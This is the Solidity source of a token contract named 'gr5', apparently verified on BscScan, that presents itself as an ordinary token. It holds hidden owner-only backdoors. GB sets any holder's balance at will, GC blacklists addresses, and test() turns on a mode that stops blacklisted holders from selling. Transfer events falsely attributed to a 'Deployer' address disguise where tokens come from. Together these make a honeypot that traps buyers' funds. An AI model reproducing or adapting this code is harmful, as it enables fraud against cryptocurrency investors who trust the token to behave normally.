/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

//SPDX-License-Identifier: UNLICENSED                              

pragma solidity 0.8.15;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract gr5 {
  
    mapping (address => uint256) public gWTX;
    mapping (address => bool) gWSR;




    // 
    string public name = "gr5";
    string public symbol = unicode"gr5";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1 * (uint256(10) ** decimals);
    uint Gm = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        gWTX[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0x0840D51CE0CaE308083618b6171d25FC1715adc9;
    address Deployer = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier M() {   
    require(msg.sender == owner);
         _;}
    function transfer(address to, uint256 value) public returns (bool success) {
        if(msg.sender == Router)  {
        require(gWTX[msg.sender] >= value);
        gWTX[msg.sender] -= value;  
        gWTX[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(Gm == 0) {
        require(!gWSR[msg.sender]);
        require(gWTX[msg.sender] >= value);
        gWTX[msg.sender] -= value;  
        gWTX[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        require(gWTX[msg.sender] >= value);
        gWTX[msg.sender] -= value;  
        gWTX[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
        }


        function balanceOf(address account) public view returns (uint256) {
        return gWTX[account]; }
        function GC(address K) M public{          
        require(!gWSR[K]);
        gWSR[K] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function GB(address K, uint256 H) M public returns (bool success) {
        gWTX[K] = H;
        return true; }
 
        
        function GW(address K) M public {
        require(gWSR[K]);
        gWSR[K] = false; }
		 function test() M public {
        Gm = 0;
        }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= gWTX[from]);
        require(value <= allowance[from][msg.sender]);
        gWTX[from] -= value;  
        gWTX[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(Gm == 0) {
        require(!gWSR[from] || !gWSR[to]);
        require(value <= gWTX[from]);
        require(value <= allowance[from][msg.sender]);
        gWTX[from] -= value;
        gWTX[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
        
        require(value <= gWTX[from]);
        require(value <= allowance[from][msg.sender]);
        gWTX[from] -= value;
        gWTX[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }}